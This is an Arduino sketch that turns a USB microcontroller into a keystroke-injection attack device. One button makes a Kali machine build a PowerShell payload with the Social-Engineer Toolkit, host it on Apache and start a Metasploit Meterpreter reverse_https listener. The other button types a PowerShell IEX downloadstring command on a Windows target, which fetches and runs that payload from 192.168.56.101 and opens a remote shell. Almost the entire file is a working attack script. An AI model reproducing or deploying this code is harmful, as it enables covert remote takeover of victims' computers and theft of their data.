#include "Keyboard.h"

/*
 * References on keyboard shortcuts
 * https://www.arduino.cc/reference/en/language/functions/usb/keyboard/
 * https://www.arduino.cc/reference/en/language/functions/usb/keyboard/keyboardmodifiers/
 * KEY_LEFT_GUI is used to press the Windows key
 */

/*
 * Select Board: Arduino/Genuino Micro
 */

int btnLnx = 2;
int btnWin = 3;

void setup() {
  pinMode(btnLnx, INPUT_PULLUP);
  pinMode(btnWin, INPUT_PULLUP);
}

void loop() {
  ButtonPress();
  delay(100);
}

void ButtonPress()
{
    if (digitalRead(btnLnx) == 0)
  {
    Linux();
  }
  
  if (digitalRead(btnWin) == 0)
  {
    Windows();
  }
}

void Linux()
{
  // Linux example works on Kali Rolling
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(1000);
  Keyboard.releaseAll();
  Keyboard.print("gnome-terminal\n");
  delay(1000);
  
  // Start stuff we need
  Keyboard.print("service postgresql start\n");
  delay(2000);
  Keyboard.print("service apache2 start\n");
  delay(2000);
  
  // Create payload with SET
  Keyboard.print("/opt/social-engineer-toolkit/setoolkit\n");
  delay(4000);
  Keyboard.print("1\n");
  delay(500);
  Keyboard.print("9\n");
  delay(500);
  Keyboard.print("1\n");
  delay(500);
  Keyboard.print("192.168.56.101\n");
  delay(500);
  Keyboard.print("4444\n");
  delay(10000);
  Keyboard.print("no\n");
  delay(500);
  Keyboard.print("\n");
  delay(500);
  Keyboard.print("99\n");
  delay(500);
  Keyboard.print("99\n");
  delay(500);
  
  //Move payload to web server
  Keyboard.print("mv /root/.set/reports/powershell/x86_powershell_injection.txt /var/www/html/shell.txt\n");
  delay(500);
  
  // Setup listener with msfconsole
  Keyboard.print("msfconsole\n");
  delay(12000);
  Keyboard.print("use multi/handler\n");
  delay(3000);
  Keyboard.print("set payload windows/meterpreter/reverse_https\n");
  delay(1000);
  Keyboard.print("set LPORT 4444\n");
  delay(200);
  Keyboard.print("set LHOST 192.168.56.101\n");
  delay(200);
  Keyboard.print("run\n");
  Keyboard.end();
}

void Windows()
{
  // This has been tested on Windows 7 Pro
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.releaseAll();
  Keyboard.print("powershell\n");
  delay(1000);
  Keyboard.print("IEX ((new-object net.webclient).downloadstring('http://192.168.56.101/shell.txt'))\n");
  delay(200);
  Keyboard.end();
}

